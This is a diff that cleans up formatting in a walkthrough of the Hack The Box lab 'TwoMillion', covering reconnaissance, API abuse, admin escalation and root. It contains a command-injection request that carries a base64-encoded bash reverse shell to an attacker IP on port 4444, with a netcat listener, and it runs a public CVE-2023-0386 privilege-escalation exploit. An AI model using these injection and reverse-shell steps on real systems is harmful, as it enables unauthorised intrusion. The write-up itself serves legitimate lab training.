@@ -8,15 +8,16 @@ TwoMillion is a easy HTB lab that focuses on API exposure, command injection and
 
 The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.
 
-[★]$ sudo nmap -p- -sV -sC 10.129.151.100
 ```
+[★]$ sudo nmap -p- -sV -sC 10.129.151.100
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-26 06:46 GMT
 Nmap scan report for 10.129.151.100
 Host is up (0.025s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
 |_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
 80/tcp open  http    nginx
@@ -49,14 +50,14 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2023/12/26 06:55:03 Starting gobuster in directory enumeration mode
 ===============================================================
 /logout               (Status: 302) [Size: 0] [--> /]
-/register             (Status: 200) [Size: 4527]     
-/login                (Status: 200) [Size: 3704]     
-/api                  (Status: 401) [Size: 0]        
+/register             (Status: 200) [Size: 4527]
+/login                (Status: 200) [Size: 3704]
+/api                  (Status: 401) [Size: 0]
 /home                 (Status: 302) [Size: 0] [--> /]
-/404                  (Status: 200) [Size: 1674]     
-/invite               (Status: 200) [Size: 3859]     
+/404                  (Status: 200) [Size: 1674]
+/invite               (Status: 200) [Size: 3859]
 Progress: 23928 / 30001 (79.76%)                    [ERROR] 2023/12/26 06:56:01 [!] parse "http://2million.htb/error\x1f_log": net/url: invalid control character in URL
-                                                     
+
 ===============================================================
 2023/12/26 06:56:17 Finished
 ===============================================================
@@ -101,19 +102,19 @@ function makeInviteCode() {
 
 ### Attack
 
-In order to generate the invite code, we need to make a POST request to /api/v1/invite/generate
+In order to generate the invite code, we need to make a POST request to `/api/v1/invite/generate`
 ```
 $.ajax({
-        type: "POST",
-        dataType: "json",
-        url: '/api/v1/invite/generate',
-        success: function (response) {
-            console.log(response)
-        },
-        error: function (response) {
-            console.log(response)
-        }
-    })
+    type: "POST",
+    dataType: "json",
+    url: '/api/v1/invite/generate',
+    success: function (response) {
+        console.log(response)
+    },
+    error: function (response) {
+        console.log(response)
+    }
+})
 ```
 Invite Code: `echo "NjNGNDctTEIyRFctR0RLS1otNThXUzE=" | base64 -d # 63F47-LB2DW-GDKKZ-58WS1`
 We can creat dummy credentails on the website using the invite code : `test@test.com:test`
@@ -174,44 +175,42 @@ Content-Length: 48
 OR we can use the following javascript code:
 ```
 $.ajax({
-        type: "PUT",
-        data: JSON.stringify(e),
-        dataType: "appjson",
-        contentType: "application/json",
-        url: '/api/v1/admin/settings/update',
-        success: function (response) {
-            console.log(response)
-        },
-        error: function (response) {
-            console.log(response)
-        }
-    })
+    type: "PUT",
+    data: JSON.stringify(e),
+    dataType: "appjson",
+    contentType: "application/json",
+    url: '/api/v1/admin/settings/update',
+    success: function (response) {
+        console.log(response)
+    },
+    error: function (response) {
+        console.log(response)
+    }
+})
 ```
 
 Trying to get the foothold and shell on the server.
 ```
 $.ajax({
-        type: "POST",
-        data: JSON.stringify({"username": "test; echo \"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjExOS80NDQ0IDA+JjE=\" | base64 -d | bash"}),
-        dataType: "appjson",
-        contentType: "application/json",
-        url: '/api/v1/admin/vpn/generate',
-        success: function (response) {
-            console.log(response)
-        },
-        error: function (response) {
-            console.log(response)
-        }
-    })
+    type: "POST",
+    data: JSON.stringify({"username": "test; echo \"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjExOS80NDQ0IDA+JjE=\" | base64 -d | bash"}),
+    dataType: "appjson",
+    contentType: "application/json",
+    url: '/api/v1/admin/vpn/generate',
+    success: function (response) {
+        console.log(response)
+    },
+    error: function (response) {
+        console.log(response)
+    }
+})
 
-
+# terminal 2
 $nc -lvnp 4444
 
 www-data@2million:~/html$id
 www-data
 ```
-
-
 
 ### User
 
@@ -264,13 +263,13 @@ Enumerating the machine using the `linpeas.sh` script. Got the following interes
 ```
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    LISTEN      -                   
-tcp6       0      0 :::80       
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::80
 ...
 ╔══════════╣ Mails (limit 50)
       271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/mail/admin
@@ -297,16 +296,16 @@ HTB Godfather
 
 Based on this information, we can search online for public vulnerabilities. Here the POC for exploit - https://github.com/sxlmnwb/CVE-2023-0386
 
-In the first terminal, we woudl be executing the executable.
+In the first terminal, we would be executing the executable.
 ```
 admin@2million:~/CVE-2023-0386-master$ make all
 admin@2million:~/CVE-2023-0386-master$ ./fuse ./ovlcap/lower ./gc
 admin@2million:~/CVE-2023-0386-master$ ./exp
 ```
 
-Termial 2, doing the same:
+Terminal 2, doing the same:
 ```
-admin@2million:~/CVE-2023-0386-master$ ./exp 
+admin@2million:~/CVE-2023-0386-master$ ./exp
 uid:1000 gid:1000
 [+] mount success
 total 8
